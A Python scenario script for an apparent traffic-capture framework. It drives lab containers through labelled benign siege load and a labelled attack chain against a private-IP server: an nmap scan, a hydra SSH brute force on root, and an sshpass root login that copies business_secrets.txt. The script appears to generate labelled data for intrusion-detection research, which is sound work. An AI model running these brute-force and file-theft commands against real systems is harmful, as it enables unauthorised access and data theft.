import os
import sys
from time import sleep
from random import randint

def trunc(path: str, times: int = 1):
    if times == 0: return path
    return trunc(path=os.path.dirname(path), times=times-1)

CAPTURE_DIR = trunc(os.path.abspath(__file__))
ROOT_DIR = trunc(CAPTURE_DIR, times=2)
sys.path.append(ROOT_DIR)

from Forge.Context import Context
from Forge.Controller import Controller
from Forge.Logger import Logger
from Forge.Container import Container
from Forge.Network import Network
from Forge.WebPage import createWebpage


def scenario(
        controller: Controller,
        containers: dict[str, Container],
        networks: dict[str, Network],
        pwd: str,
        logger: Logger,
        sandbox: bool,
    ) -> None:

    controller.startNetworks()

    controller.start()

    # networks["main"].setBaseConditions()

    input("Start Siege?")

    containers["siege"].run(
        command="siege -c 50 -d 10 -t1H 172.18.0.5",
        root_intent="Benign",
        intent="Stress",
        target="server"
    )

    sleep(3)

    containers["nmap-hydra"].run(
        command="nmap 172.18.0.5 -oN capture-results/nmap.txt",
        root_intent="Attack",
        intent="Nmap",
        target="server",
        detach=False
    )

    sleep(randint(5, 15))

    containers["nmap-hydra"].run(
        command="hydra -l root -P passwords.txt 172.18.0.5 -o capture-results/hydra.txt -V -I ssh -t 10",
        root_intent="Attack",
        intent="Hydra",
        target="server",
        detach=False
    )

    sleep(randint(5, 15))

    command: str = "'cd / && cat business_secrets.txt > capture-results/secrets.txt && exit'"

    containers["nmap-hydra"].run(
        command=f"sshpass -v -p root ssh -tt -o StrictHostKeyChecking=no root@172.18.0.5 {command}",
        root_intent="Attack",
        intent="SSH",
        target="server",
        detach=False
    )

    sleep(randint(5, 15))

    controller.complete(
        trail="data/trail.sh",
        intents="data/intents.txt",
        skip_flows=False,
        skip_tests=False,
        skip_webpage=False
    )

    logger.outLog(f"{pwd}/data/log.txt")

    return


def main() -> None:

    sandbox: bool = False

    logger = Logger(rolling_messages=True, interesting_only=True)
    controller: Controller = Controller(
        pwd=CAPTURE_DIR,
        logger=logger,
        sandbox=sandbox,
        requires_sudo=False
    )
    context: Context = controller.context
    containers: dict[str, Container] = context.getContainers()
    networks = context.getNetworks()

    scenario(
        controller=controller,
        containers=containers,
        networks=networks,
        pwd=CAPTURE_DIR,
        logger=logger,
        sandbox=sandbox
    )

    return


if __name__ == "__main__":
    main()
